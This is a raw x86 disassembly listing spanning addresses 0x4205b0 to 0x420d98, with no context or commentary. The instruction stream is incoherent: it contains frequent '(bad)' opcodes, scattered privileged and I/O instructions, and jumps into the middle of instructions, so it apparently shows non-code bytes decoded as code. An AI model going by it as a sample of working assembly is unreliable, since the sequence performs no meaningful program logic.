  4205b0:	xor    ecx,DWORD PTR [ebx+0x58d7696f]
  4205b6:	jmp    0x42055c
  4205b8:	lahf   
  4205b9:	(bad)  
  4205ba:	leave  
  4205bb:	jmp    0x76b8:0x60e842ac
  4205c2:	cld    
  4205c3:	pop    ecx
  4205c4:	jmp    0x420631
  4205c6:	push   edx
  4205c7:	into   
  4205c8:	outs   dx,BYTE PTR ds:[esi]
  4205c9:	ds pop ecx
  4205cb:	inc    ebx
  4205cc:	es data16 (bad) 
  4205cf:	push   edx
  4205d0:	dec    edi
  4205d1:	xchg   edx,eax
  4205d2:	iret   
  4205d3:	add    al,0x1d
  4205d5:	rcl    dh,0xd4
  4205d8:	add    al,bl
  4205da:	push   es
  4205db:	cmp    DWORD PTR [ecx],ecx
  4205dd:	popa   
  4205de:	nop
  4205df:	test   DWORD PTR [ecx+0x33d9d755],edi
  4205e5:	retf   0x1228
  4205e8:	outs   dx,DWORD PTR ds:[esi]
  4205e9:	jmp    0xdcf351b9
  4205ee:	dec    ecx
  4205ef:	dec    ebp
  4205f0:	inc    ebp
  4205f1:	sbb    al,cl
  4205f3:	lahf   
  4205f4:	rcr    eax,1
  4205f6:	sbb    ebp,DWORD PTR [edi]
  4205f8:	push   eax
  4205f9:	test   BYTE PTR [ebp-0x40],ch
  4205fc:	outs   dx,BYTE PTR ds:[esi]
  4205fd:	mov    ebp,0xf2cc8bdf
  420602:	iret   
  420603:	add    al,0xe2
  420605:	aaa    
  420606:	push   esp
  420607:	fisttp QWORD PTR [ecx-0x4d]
  42060a:	scas   al,BYTE PTR es:[edi]
  42060b:	and    eax,0xae3fb02d
  420610:	jae    0x4205fd
  420612:	sbb    eax,0x1f5df3d
  420617:	pop    eax
  420618:	or     DWORD PTR [esi-0x723bdeab],edx
  42061e:	stc    
  42061f:	adc    DWORD PTR [ebx],ebx
  420621:	dec    ebp
  420622:	add    DWORD PTR [edx+0x195ff552],edx
  420628:	fdiv   st,st(1)
  42062a:	or     dl,ah
  42062c:	inc    edx
  42062d:	and    al,0xd5
  42062f:	mov    ch,0xfc
  420631:	push   ebp
  420632:	jle    0x4206a0
  420634:	loop   0x4205cf
  420636:	or     ebp,0x559d41bf
  42063c:	lea    esp,[ebp-0x2ecb904b]
  420642:	fdivr  DWORD PTR [eax+ebp*2+0x468f3a12]
  42064a:	push   esi
  42064b:	ss xchg edi,eax
  42064d:	into   
  42064e:	out    0x5e,eax
  420650:	dec    ebp
  420651:	pop    ebx
  420652:	ss xor al,0x94
  420655:	arpl   bp,cx
  420657:	icebp  
  420658:	mov    edx,0xc7f237d3
  42065d:	or     ebx,edi
  42065f:	jecxz  0x420667
  420661:	repnz in al,dx
  420663:	nop
  420664:	xchg   DWORD PTR ds:0x43255f6b,esp
  42066a:	jp     0x420606
  42066c:	push   DWORD PTR [eax-0x52baa0b4]
  420672:	xor    DWORD PTR [eax],0xebe3bfbf
  420678:	jnp    0x4205fd
  42067a:	repz lahf 
  42067c:	out    dx,eax
  42067d:	mov    dh,0x5d
  42067f:	or     al,0xbd
  420681:	jbe    0x4206d3
  420683:	pushf  
  420684:	cmp    eax,0xd9869a64
  420689:	lock or ah,dl
  42068c:	outs   dx,DWORD PTR ds:[esi]
  42068d:	mov    ebx,0x32a650d0
  420692:	cmp    eax,0xbb937dcd
  420697:	into   
  420698:	fadd   DWORD PTR [esi-0xa]
  42069b:	push   ss
  42069c:	ret    
  42069d:	lods   eax,DWORD PTR ds:[esi]
  42069e:	mov    eax,ds:0xd5990497
  4206a3:	test   eax,0xc8b5ab7f
  4206a8:	fcom   QWORD PTR [ebx-0x2a]
  4206ab:	pop    ebp
  4206ac:	push   esp
  4206ad:	mov    dh,0xe
  4206af:	jge    0x4206da
  4206b1:	lds    eax,FWORD PTR [ecx]
  4206b3:	call   0xd8d2d095
  4206b8:	dec    edi
  4206b9:	add    dl,ch
  4206bb:	das    
  4206bc:	popf   
  4206bd:	lods   eax,DWORD PTR ds:[esi]
  4206be:	sahf   
  4206bf:	and    bh,BYTE PTR [ebx+edi*2-0x46aea3d7]
  4206c6:	pop    edx
  4206c7:	cwde   
  4206c8:	or     BYTE PTR [eax-0x18],al
  4206cb:	fimul  WORD PTR [eax]
  4206cd:	xchg   edi,eax
  4206ce:	es push eax
  4206d0:	out    0xb4,al
  4206d2:	mov    bh,0xe6
  4206d4:	out    0xdd,eax
  4206d6:	push   esp
  4206d7:	shl    BYTE PTR [eax+0x7ffa0ac],cl
  4206dd:	in     eax,dx
  4206de:	add    DWORD PTR [ebp-0x2f],0xffffff80
  4206e2:	sahf   
  4206e3:	retf   
  4206e4:	je     0x4206be
  4206e6:	repz jp 0x42067c
  4206e9:	test   ch,ah
  4206eb:	aam    0x84
  4206ed:	inc    esp
  4206ee:	repnz sub bh,dl
  4206f1:	sbb    al,0x4f
  4206f3:	xchg   BYTE PTR gs:[esi+ecx*4],al
  4206f7:	imul   esi,DWORD PTR [ebx+ebp*8-0x38],0x47
  4206fc:	arpl   WORD PTR [esi+0x6e],cx
  4206ff:	inc    edi
  420700:	xor    edx,esp
  420702:	xor    al,0x9f
  420704:	xchg   ecx,eax
  420705:	es mov dh,0x18
  420708:	jle    0x42071a
  42070a:	gs inc esi
  42070c:	jns    0x4206d0
  42070e:	cmc    
  42070f:	and    dh,BYTE PTR [ebx-0x63]
  420712:	pop    edx
  420713:	popa   
  420714:	jo     0x420754
  420716:	mov    bh,0xa4
  420718:	retf   
  420719:	out    0xf3,al
  42071b:	bound  esp,QWORD PTR [eax+0x2d10deec]
  420721:	xor    cl,cl
  420723:	stos   BYTE PTR es:[edi],al
  420724:	jge    0x42073a
  420726:	stc    
  420727:	pop    es
  420728:	rcr    esi,1
  42072a:	stc    
  42072b:	push   0x46
  42072d:	into   
  42072e:	jmp    0x3a79:0xcbddc884
  420735:	sub    ch,BYTE PTR [edx-0x7d]
  420738:	retf   
  420739:	pop    ebp
  42073a:	inc    ebp
  42073b:	(bad)
  42073e:	data16 sub al,dh
  420741:	xor    al,BYTE PTR [edi]
  420743:	mov    bh,0x38
  420745:	bound  esi,QWORD PTR [ecx+0x598120ba]
  42074b:	mov    dl,0xe8
  42074d:	ror    DWORD PTR [ecx+0x2a],cl
  420750:	ds (bad) 
  420752:	push   edi
  420753:	xchg   esp,eax
  420754:	aas    
  420755:	imul   ebp,DWORD PTR [eax+0x29e57953],0x3497f1ff
  42075f:	xor    esp,DWORD PTR [ebp-0x1f]
  420762:	sub    eax,0x3e0ee636
  420767:	repz add DWORD PTR fs:[ecx],edx
  42076b:	scas   al,BYTE PTR es:[edi]
  42076c:	ret    0x6d36
  42076f:	xor    DWORD PTR [edi-0x3ace32b0],edx
  420775:	pop    ebp
  420776:	dec    esi
  420777:	jns    0x420765
  420779:	push   es
  42077a:	add    DWORD PTR [eax+0x274de256],esi
  420780:	sub    al,0x4e
  420782:	dec    ebx
  420783:	js     0x42079f
  420785:	mov    eax,0x4e5833ce
  42078a:	or     edx,DWORD PTR [edi]
  42078c:	outs   dx,DWORD PTR ds:[esi]
  42078d:	sti    
  42078e:	mov    ds:0x6aaa90fa,al
  420793:	clc    
  420794:	mov    dh,0x22
  420796:	lods   al,BYTE PTR ds:[esi]
  420797:	stos   BYTE PTR es:[edi],al
  420798:	inc    ecx
  420799:	pop    ecx
  42079a:	jecxz  0x420771
  42079c:	xor    BYTE PTR [ebp+0x5],bl
  42079f:	inc    esi
  4207a0:	mul    BYTE PTR [eax+0x1713e87d]
  4207a6:	mov    esp,0x377db9ab
  4207ab:	mov    ecx,ebp
  4207ad:	push   eax
  4207ae:	jbe    0x420731
  4207b0:	(bad)  
  4207b1:	and    BYTE PTR [eax+0x77d2f157],cl
  4207b7:	jle    0x420750
  4207b9:	push   esp
  4207ba:	mov    ebp,0x438f7b12
  4207bf:	je     0x420775
  4207c1:	stos   DWORD PTR es:[edi],eax
  4207c2:	enter  0x7836,0xe5
  4207c6:	int    0x96
  4207c8:	jg     0x4207f7
  4207ca:	pop    edi
  4207cb:	dec    ebx
  4207cc:	add    ch,BYTE PTR [edx-0x1fb6190a]
  4207d2:	fs mov al,0x3d
  4207d5:	xor    DWORD PTR [ebx],ebp
  4207d7:	fwait
  4207d8:	pop    es
  4207d9:	pop    esp
  4207da:	jb     0x420760
  4207dc:	mov    cl,0xfd
  4207de:	jnp    0x4207c0
  4207e0:	mul    dh
  4207e2:	cmc    
  4207e3:	xor    BYTE PTR [ebx+0x17],dl
  4207e6:	js     0x420818
  4207e8:	jg     0x42079d
  4207ea:	pop    eax
  4207eb:	push   edi
  4207ec:	sbb    al,0xa7
  4207ee:	clc    
  4207ef:	xor    al,0xa0
  4207f1:	xchg   edi,eax
  4207f2:	test   BYTE PTR [ebp+0x7ea3855c],0xe3
  4207f9:	ins    DWORD PTR es:[edi],dx
  4207fa:	inc    ecx
  4207fb:	xor    al,0xb
  4207fd:	out    0x81,al
  4207ff:	push   0x1c
  420801:	(bad)  
  420802:	out    dx,eax
  420803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420804:	xchg   DWORD PTR [ecx+edx*4+0x695d04c2],ecx
  42080b:	into   
  42080c:	xchg   ebx,eax
  42080d:	jmp    0xfa65:0x2eb5b986
  420814:	jge    0x420877
  420816:	and    bh,dl
  420818:	fistp  DWORD PTR [esi+0x1b49d86e]
  42081e:	mov    ch,0xf9
  420820:	ret    
  420821:	adc    al,0xd7
  420823:	rcr    ebx,1
  420825:	jmp    esp
  420827:	pop    eax
  420828:	jno    0x420889
  42082a:	or     BYTE PTR [edx+0x714cc54a],dh
  420830:	cmp    ebp,DWORD PTR [eax-0x11e3907d]
  420836:	mov    ecx,0x2014ae75
  42083b:	xor    bl,BYTE PTR [ebp-0x58af6dd7]
  420841:	dec    esp
  420842:	mov    DWORD PTR [edi-0x4f],edi
  420845:	push   ebp
  420846:	aaa    
  420847:	xchg   esi,eax
  420848:	mov    WORD PTR ds:0x80286366,ds
  42084e:	in     eax,0xc1
  420850:	enter  0xb479,0xf5
  420854:	cmc    
  420855:	inc    bp
  420857:	fst    QWORD PTR [edx]
  420859:	sbb    BYTE PTR [esi+0x5c],dh
  42085c:	data16 lock jb 0x4208d5
  420860:	push   0xffffffed
  420862:	mov    BYTE PTR [edi],bh
  420864:	adc    eax,0x79dd5ed7
  420869:	push   0xffac4a56
  42086e:	bound  esi,QWORD PTR [eax+0x43]
  420871:	les    ebp,FWORD PTR [eax+ebp*4+0x46]
  420875:	popf   
  420876:	sbb    BYTE PTR [esi-0x3b],al
  420879:	test   BYTE PTR [edx+edx*8+0x28],bh
  42087d:	pop    edx
  42087e:	push   cs
  42087f:	ret    
  420880:	xchg   esi,eax
  420881:	in     al,0xd8
  420883:	mov    al,ds:0xf0ce63d1
  420888:	mov    eax,ds:0x172525d9
  42088d:	and    cl,BYTE PTR [edi]
  42088f:	cmc    
  420890:	sbb    DWORD PTR [ebx-0x20290b62],esi
  420896:	ins    DWORD PTR es:[edi],dx
  420897:	cld    
  420898:	mov    cl,0x7a
  42089a:	cwde   
  42089b:	xchg   DWORD PTR ds:0x384c7a3d,eax
  4208a1:	mov    ecx,0xb3f29e3a
  4208a6:	jecxz  0x4208d8
  4208a8:	and    ah,bh
  4208aa:	sti    
  4208ab:	or     al,0x94
  4208ad:	mov    eax,ds:0x67b4228
  4208b2:	xchg   esi,eax
  4208b3:	bound  ecx,QWORD PTR [ebx+0x7bf5cadb]
  4208b9:	fcom   QWORD PTR [ebx+0x3d047f87]
  4208bf:	dec    esp
  4208c0:	adc    al,dh
  4208c2:	mov    ds:0x9ff48fa5,al
  4208c7:	push   eax
  4208c8:	stos   BYTE PTR es:[edi],al
  4208c9:	cmc    
  4208ca:	jno    0x4208a8
  4208cc:	test   BYTE PTR [edx+0x3a721b11],cl
  4208d2:	jmp    0xdf02608a
  4208d7:	pop    eax
  4208d8:	dec    ebx
  4208d9:	mov    eax,0x90654ea
  4208de:	add    al,0xd0
  4208e0:	aaa    
  4208e1:	or     edi,edi
  4208e3:	leave  
  4208e4:	push   0x4e
  4208e6:	inc    ebx
  4208e7:	clc    
  4208e8:	mov    bh,0xb7
  4208ea:	pop    ds
  4208eb:	loop   0x420881
  4208ed:	push   0x45ce37d6
  4208f2:	imul   BYTE PTR [ebp+0x49ac3c39]
  4208f8:	sbb    eax,0xa439d48c
  4208fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208fe:	add    eax,0x638517fe
  420903:	inc    ax
  420905:	pop    es
  420906:	pushf  
  420907:	sbb    al,0x21
  420909:	mov    ds,WORD PTR [ebx+eax*2-0x20]
  42090d:	sbb    ch,bh
  42090f:	out    dx,eax
  420910:	dec    ebp
  420911:	lds    ebp,FWORD PTR [edi+0x37]
  420914:	push   ss
  420915:	fcmovbe st,st(4)
  420917:	icebp  
  420918:	jmp    0x4208ce
  42091a:	cmc    
  42091b:	call   0x3d26:0xe40814ac
  420922:	clc    
  420923:	les    ebx,FWORD PTR ds:0xf61af393
  420929:	mov    al,ds:0x3522f8a0
  42092e:	cmp    dh,BYTE PTR [ecx+0x7dd26089]
  420934:	cwde   
  420935:	clc    
  420936:	fisttp QWORD PTR cs:[edi-0x3d]
  42093a:	ins    DWORD PTR es:[edi],dx
  42093b:	dec    eax
  42093c:	mov    es,WORD PTR [eax+0x79]
  42093f:	clc    
  420940:	es xor eax,0x78eeb42c
  420946:	lahf   
  420947:	xor    al,0x4f
  420949:	cmp    al,0x90
  42094b:	aad    0xd1
  42094d:	setnp  BYTE PTR [esi+ebx*4+0x18ade605]
  420955:	cmp    BYTE PTR [ebp+0x39],cl
  420958:	popf   
  420959:	jnp    0x4209ca
  42095b:	push   esi
  42095c:	aad    0xd8
  42095e:	and    BYTE PTR ds:0x94e199d2,dl
  420964:	pop    ebp
  420965:	dec    ebx
  420966:	mov    ds:0xa288041f,al
  42096b:	xchg   BYTE PTR [edi+0x3],ch
  42096e:	shl    DWORD PTR [esi],0x97
  420971:	(bad)  
  420972:	fst    QWORD PTR [eax-0x72]
  420975:	fs inc ecx
  420977:	sub    bh,0x62
  42097a:	(bad)
  42097d:	fiadd  WORD PTR [edi+0x73f6b954]
  420983:	dec    edi
  420984:	add    eax,0xcae4eccb
  420989:	jmp    0x8eb3:0x1265fa17
  420990:	sbb    dl,BYTE PTR [esi]
  420992:	dec    esi
  420993:	leave  
  420994:	es inc ebp
  420996:	mov    BYTE PTR [esp+edi*2],al
  420999:	je     0x420978
  42099b:	retf   0xe89b
  42099e:	scas   eax,DWORD PTR es:[edi]
  42099f:	(bad)  
  4209a0:	dec    esi
  4209a1:	test   al,0xe4
  4209a3:	imul   ebx,DWORD PTR [esi-0x6dec845f],0xf7ca1d6e
  4209ad:	in     al,dx
  4209ae:	repz inc edi
  4209b0:	mov    al,ds:0x8c4db269
  4209b5:	in     eax,0x4b
  4209b7:	iret   
  4209b8:	sub    DWORD PTR [eax],ecx
  4209ba:	cdq    
  4209bb:	scas   al,BYTE PTR es:[edi]
  4209bc:	mov    bl,0x81
  4209be:	jg     0x420969
  4209c0:	bound  ecx,QWORD PTR [eax+eiz*2-0x19]
  4209c4:	sbb    esi,esi
  4209c6:	pop    eax
  4209c7:	sbb    BYTE PTR [ebx],0xb6
  4209ca:	mov    edx,0x6520be7a
  4209cf:	dec    ecx
  4209d0:	or     eax,DWORD PTR [esi-0x1c]
  4209d3:	(bad)  
  4209d4:	push   esi
  4209d5:	popa   
  4209d6:	xor    cl,0x27
  4209d9:	(bad)
  4209dc:	retf   
  4209dd:	ja     0x420a16
  4209df:	in     eax,0xa7
  4209e1:	call   0xb88df6c6
  4209e6:	pop    edi
  4209e7:	or     DWORD PTR ds:0x64b89d07,esi
  4209ed:	and    cl,0x85
  4209f0:	jecxz  0x4209d7
  4209f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209f3:	mov    edx,0xa9741954
  4209f8:	repnz mov al,ds:0xd468c3b
  4209fe:	sbb    ah,ah
  420a00:	lods   al,BYTE PTR ds:[esi]
  420a01:	add    dl,BYTE PTR [ecx-0x49]
  420a04:	and    BYTE PTR [ebx+0x5b],dl
  420a07:	adc    ah,BYTE PTR [esi+0x74]
  420a0a:	add    al,0x30
  420a0c:	add    eax,0x53d556cd
  420a11:	jne    0x420a6c
  420a13:	sbb    al,0xb6
  420a15:	call   0x48802de0
  420a1a:	pushf  
  420a1b:	xchg   DWORD PTR [ebx+0x5f2a3250],ebp
  420a21:	fldcw  WORD PTR [edi]
  420a23:	pop    DWORD PTR [ebp-0x31]
  420a26:	adc    DWORD PTR [ebx+0x680e6b86],edx
  420a2c:	in     al,dx
  420a2d:	cmp    DWORD PTR [edi+0x18],ebp
  420a30:	adc    eax,0xab396aa3
  420a35:	in     eax,dx
  420a36:	aad    0xf6
  420a38:	cwde   
  420a39:	cmp    eax,DWORD PTR ds:0xc5f145a6
  420a3f:	pop    esp
  420a40:	das    
  420a41:	idiv   ch
  420a43:	fistp  DWORD PTR [esi-0x3d]
  420a46:	mov    esp,0x60e3ff59
  420a4b:	or     DWORD PTR ds:0xbe9a7fa6,0x61
  420a52:	jg     0x420ab1
  420a54:	pop    ss
  420a55:	fst    QWORD PTR [ebp-0x6e]
  420a58:	inc    ebp
  420a59:	js     0x420a15
  420a5b:	cmp    al,0x8a
  420a5d:	mov    ecx,cs
  420a5f:	cmp    ch,cl
  420a61:	xor    BYTE PTR [ebx-0x59],dh
  420a64:	mov    ebp,0xe72840b8
  420a69:	jp     0x420a90
  420a6b:	gs mov edi,0xd301263c
  420a71:	sbb    DWORD PTR [edx],edx
  420a73:	call   0x9a0dd60e
  420a78:	addr16 sti 
  420a7a:	xor    al,0x9a
  420a7c:	(bad)  
  420a7d:	and    eax,0x94675e65
  420a82:	pop    edi
  420a83:	cdq    
  420a84:	add    edi,DWORD PTR [edx-0x54ff8f50]
  420a8a:	fist   DWORD PTR [ebp-0x22]
  420a8d:	dec    esp
  420a8e:	xor    BYTE PTR [ebp+0x78],bh
  420a91:	mov    edx,0x85cea23d
  420a96:	sbb    DWORD PTR ds:0x194e4b0a,0x33
  420a9d:	dec    DWORD PTR [ecx-0x61]
  420aa0:	push   0xffffffa6
  420aa2:	push   edi
  420aa3:	xchg   edi,eax
  420aa4:	jl     0x420a3d
  420aa6:	adc    ch,dl
  420aa8:	(bad)  
  420aa9:	sbb    BYTE PTR [edx],cl
  420aab:	inc    eax
  420aac:	mov    dh,BYTE PTR fs:[ebp+0x31]
  420ab0:	test   BYTE PTR [eax+0x4f],ch
  420ab3:	inc    ebx
  420ab4:	popf   
  420ab5:	jns    0x420b03
  420ab7:	mov    edi,0x42a2bd5d
  420abc:	fmul   st,st(6)
  420abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420abf:	ss and eax,0x6543b455
  420ac5:	or     ch,BYTE PTR [eax]
  420ac7:	mov    ds:0x5073ed4d,eax
  420acc:	ins    BYTE PTR es:[edi],dx
  420acd:	in     al,0x88
  420acf:	mov    edi,0x7dd99b50
  420ad4:	cmp    al,0xbc
  420ad6:	mov    esp,0xf7360c2e
  420adb:	pushf  
  420adc:	(bad)  
  420add:	adc    al,0x5f
  420adf:	das    
  420ae0:	lahf   
  420ae1:	retf   
  420ae2:	xchg   ebx,eax
  420ae3:	jno    0x420af2
  420ae5:	outs   dx,DWORD PTR ds:[esi]
  420ae6:	ficom  WORD PTR [eax+0x6c]
  420ae9:	popf   
  420aea:	ss mov edi,0x9d6c4a99
  420af0:	or     bl,BYTE PTR [edi+0x699d590b]
  420af6:	dec    esi
  420af7:	sub    bl,BYTE PTR [edx]
  420af9:	push   esi
  420afa:	inc    esi
  420afb:	in     eax,dx
  420afc:	addr16 in eax,dx
  420afe:	pop    edx
  420aff:	xor    al,0xef
  420b01:	sbb    DWORD PTR [esi],edi
  420b03:	dec    edi
  420b04:	shl    dh,1
  420b06:	test   BYTE PTR [ebx-0x5405e888],dh
  420b0c:	mov    ch,0x16
  420b0e:	add    BYTE PTR fs:[esi+0x1c21e72d],0x1
  420b16:	sar    DWORD PTR [edi-0x67],cl
  420b19:	lods   eax,DWORD PTR ds:[esi]
  420b1a:	and    al,0x3f
  420b1c:	sub    BYTE PTR [edx-0x149ec4da],dl
  420b22:	or     edi,0xffffff90
  420b25:	push   es
  420b26:	mov    eax,es
  420b28:	mov    esp,ecx
  420b2a:	add    BYTE PTR ds:0x8e1bd621,0xcc
  420b31:	retf   
  420b32:	adc    esi,eax
  420b34:	push   esp
  420b35:	jnp    0x420b91
  420b37:	dec    edx
  420b38:	test   eax,0x96d7058e
  420b3d:	push   0x36cb2020
  420b42:	mov    BYTE PTR [ebp+ebp*4+0x5],dh
  420b46:	adc    dl,BYTE PTR [edi]
  420b48:	dec    DWORD PTR [eax+0xa37a296]
  420b4e:	mov    edx,0x165c82f8
  420b53:	mov    ch,0xf0
  420b55:	dec    eax
  420b56:	push   0xb4e9127d
  420b5b:	push   es
  420b5c:	jno    0x420b57
  420b5e:	aam    0xaf
  420b60:	in     al,dx
  420b61:	je     0x420b94
  420b63:	add    eax,0xbc6dabad
  420b68:	fnsave ds:0xbd3a9db7
  420b6e:	xor    eax,0x6aab03a3
  420b73:	fwait
  420b74:	mov    eax,0xb22e175b
  420b79:	call   0x45cb:0x134dc46a
  420b80:	daa    
  420b81:	pop    ecx
  420b82:	test   BYTE PTR [ebp+edx*4-0x2a6e6704],bl
  420b89:	test   DWORD PTR [ecx-0x3dddb9fb],ecx
  420b8f:	lods   al,BYTE PTR ds:[esi]
  420b90:	aam    0x52
  420b92:	dec    ecx
  420b93:	adc    edi,edi
  420b95:	push   ss
  420b96:	sti    
  420b97:	adc    BYTE PTR [edi+0x3d],dl
  420b9a:	pusha  
  420b9b:	mov    ebx,0xfc1f295c
  420ba0:	arpl   WORD PTR [edx+edi*1],di
  420ba3:	stos   BYTE PTR es:[edi],al
  420ba4:	add    eax,0xe740b006
  420ba9:	sbb    esp,0xffffffef
  420bac:	push   edx
  420bad:	and    BYTE PTR [edx+0xe37cf0],ah
  420bb3:	mov    bl,0xc9
  420bb5:	adc    edx,DWORD PTR [ebp-0x5cc86ea7]
  420bbb:	lahf   
  420bbc:	test   DWORD PTR [ebx],0xfc307434
  420bc2:	js     0x420b7e
  420bc4:	clc    
  420bc5:	out    0x5b,al
  420bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bc8:	push   edi
  420bc9:	icebp  
  420bca:	shl    DWORD PTR [edx],cl
  420bcc:	fadd   QWORD PTR [ecx+0x38]
  420bcf:	jle    0x420bc9
  420bd1:	cmp    edx,DWORD PTR [ebp+0x57f078c4]
  420bd7:	sar    BYTE PTR [edi],cl
  420bd9:	sub    BYTE PTR [eax-0x2],dl
  420bdc:	sbb    BYTE PTR [edi],cl
  420bde:	push   edx
  420bdf:	stc    
  420be0:	pop    es
  420be1:	jns    0x420bde
  420be3:	sub    DWORD PTR [ebx],edx
  420be5:	mov    BYTE PTR [ebp+0x38],ah
  420be8:	loop   0x420be9
  420bea:	inc    ecx
  420beb:	cs jl  0x420c5b
  420bee:	xor    esi,DWORD PTR [esi+0x59e508d0]
  420bf4:	adc    al,0xe4
  420bf6:	ficom  WORD PTR [eax+0x14]
  420bf9:	cmp    ah,BYTE PTR [ebx-0xe]
  420bfc:	dec    eax
  420bfd:	retf   
  420bfe:	mov    esi,0x75a56358
  420c03:	xor    BYTE PTR [edi-0x1939e585],ah
  420c09:	xor    eax,0x4f3467c7
  420c0e:	pop    edi
  420c0f:	and    BYTE PTR [eax-0x5a],al
  420c12:	hlt    
  420c13:	inc    esi
  420c14:	push   0x11
  420c16:	xor    ch,BYTE PTR [ebp+0x27aaccaf]
  420c1c:	mov    es,WORD PTR [edi+ebx*1]
  420c1f:	fwait
  420c20:	in     al,dx
  420c21:	cmp    bh,dh
  420c23:	aam    0x16
  420c25:	push   edi
  420c26:	in     eax,0xeb
  420c28:	fcom   QWORD PTR [edi+0x77]
  420c2b:	or     edx,ebx
  420c2d:	icebp  
  420c2e:	cmp    DWORD PTR [edi+0x64],edi
  420c31:	jmp    0xfda33e1
  420c36:	inc    esi
  420c37:	rcr    BYTE PTR [eax],cl
  420c39:	out    dx,eax
  420c3a:	or     edi,ebx
  420c3c:	stos   BYTE PTR es:[edi],al
  420c3d:	add    ebx,DWORD PTR [edi-0x24]
  420c40:	rol    BYTE PTR [ecx-0x1498c29f],1
  420c46:	(bad)  
  420c47:	into   
  420c48:	jge    0x420c16
  420c4a:	cdq    
  420c4b:	popa   
  420c4c:	pop    ebp
  420c4d:	add    eax,0xb0f8ee60
  420c52:	xor    al,0x6d
  420c54:	(bad)  
  420c55:	fiadd  WORD PTR [ecx+edi*8]
  420c58:	cmp    BYTE PTR [esp+esi*2+0x53e0b1e],bh
  420c5f:	repz test eax,0x19813844
  420c65:	ror    BYTE PTR [esi+0x27b263ed],1
  420c6b:	jbe    0x420cd8
  420c6d:	ins    DWORD PTR es:[edi],dx
  420c6e:	xor    eax,esp
  420c70:	sbb    edi,edi
  420c72:	inc    esi
  420c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c74:	out    0x9d,eax
  420c76:	jo     0x420c2c
  420c78:	(bad)  
  420c79:	fstp   DWORD PTR [edi+0x779a790f]
  420c7f:	mov    edi,0xf90619db
  420c84:	cdq    
  420c85:	bnd ret 0xe3c
  420c89:	(bad)  
  420c8a:	xchg   edi,eax
  420c8b:	aas    
  420c8c:	je     0x420cc7
  420c8e:	push   ebx
  420c8f:	shl    DWORD PTR [edi],1
  420c91:	sub    bl,ah
  420c93:	add    DWORD PTR [esp+eax*2-0x5e],ecx
  420c97:	xor    esp,ebp
  420c99:	and    eax,0x440a35af
  420c9e:	loopne 0x420c63
  420ca0:	mov    dh,0x21
  420ca2:	pop    esp
  420ca3:	mov    ecx,0x593d791c
  420ca8:	mov    eax,0x5c57cfcc
  420cad:	mov    gs,WORD PTR [edi-0x31dab812]
  420cb3:	repnz loop 0x420cb7
  420cb6:	fstp   QWORD PTR [eax-0x49]
  420cb9:	dec    ebp
  420cba:	xchg   BYTE PTR [edi],dh
  420cbc:	fsub   DWORD PTR [esi+ebx*4+0x58]
  420cc0:	in     eax,dx
  420cc1:	mov    al,ds:0x4f03c06a
  420cc6:	popw   ds
  420cc8:	ins    BYTE PTR es:[edi],dx
  420cc9:	fst    st(3)
  420ccb:	ja     0x420c75
  420ccd:	xor    bh,ch
  420ccf:	sub    DWORD PTR [ebp+edi*4-0x24],ecx
  420cd3:	mov    dh,0x3f
  420cd5:	ins    DWORD PTR es:[edi],dx
  420cd6:	(bad)  
  420cd7:	sub    DWORD PTR [edi-0x56c16d86],esi
  420cdd:	jle    0x420cad
  420cdf:	imul   ebx,DWORD PTR [eax-0x57341251],0x58
  420ce6:	jmp    0xd0b4b204
  420ceb:	pusha  
  420cec:	leave  
  420ced:	loope  0x420d5b
  420cef:	rcr    BYTE PTR [edi-0x4979e751],1
  420cf5:	into   
  420cf6:	rcl    BYTE PTR [edx],0x93
  420cf9:	mov    es,WORD PTR [edx+0x5637ec24]
  420cff:	adc    al,0x7d
  420d01:	push   esp
  420d02:	js     0x420c90
  420d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d05:	push   esi
  420d06:	push   ds
  420d07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d08:	out    0x48,eax
  420d0a:	mov    eax,ebx
  420d0c:	std    
  420d0d:	mov    al,0x0
  420d0f:	xor    edi,DWORD PTR [ecx]
  420d11:	(bad)  
  420d12:	pusha  
  420d13:	jp     0x420d1d
  420d15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d16:	lea    esi,[edx]
  420d18:	pop    ebp
  420d19:	mov    ah,BYTE PTR [edx-0x18]
  420d1c:	inc    DWORD PTR [esi]
  420d1e:	xchg   DWORD PTR [eax-0x41fe5a35],edi
  420d24:	mov    eax,ds:0xd3169953
  420d29:	cdq    
  420d2a:	xor    esp,DWORD PTR [ebx+eiz*2-0x67]
  420d2e:	arpl   WORD PTR [edx],dx
  420d30:	jbe    0x420d29
  420d32:	mov    BYTE PTR [eax-0x65],cl
  420d35:	cmp    DWORD PTR [esi+ebx*2],eax
  420d38:	adc    esp,eax
  420d3a:	fnstsw WORD PTR [esi-0x5b]
  420d3d:	pop    ds
  420d3e:	mov    al,0x7f
  420d40:	inc    esi
  420d41:	sbb    dh,BYTE PTR [eax+0x6213a6e4]
  420d47:	pop    ebp
  420d48:	cli    
  420d49:	mov    ah,0x98
  420d4b:	out    dx,al
  420d4c:	aam    0xe3
  420d4e:	mov    edx,0xc96b5ef3
  420d53:	mov    al,ds:0x2a16c3e4
  420d58:	add    BYTE PTR [eax+0x73],0xbf
  420d5c:	jl     0x420ce6
  420d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d5f:	cmp    esp,DWORD PTR [eax]
  420d61:	or     cl,BYTE PTR [edi]
  420d63:	std    
  420d64:	imul   esp,DWORD PTR [esi+0x76e9dc5a],0xe9bd0ff0
  420d6e:	pop    es
  420d6f:	repnz mov eax,ds:0x38af43d2
  420d75:	cdq    
  420d76:	addr16 jbe 0x420df2
  420d79:	cld    
  420d7a:	sti    
  420d7b:	clc    
  420d7c:	xchg   ecx,eax
  420d7d:	fwait
  420d7e:	push   ebx
  420d7f:	not    ebp
  420d81:	push   0x7140d452
  420d86:	(bad)  
  420d87:	fld    DWORD PTR [ebp+edi*8+0x69cfa67e]
  420d8e:	xchg   esi,eax
  420d8f:	popa   
  420d90:	mov    ebx,0x8c911f55
  420d95:	std    
  420d96:	dec    esi
  420d97:	hlt    
  420d98:	add    edi,DWORD PTR [edi-0x2]
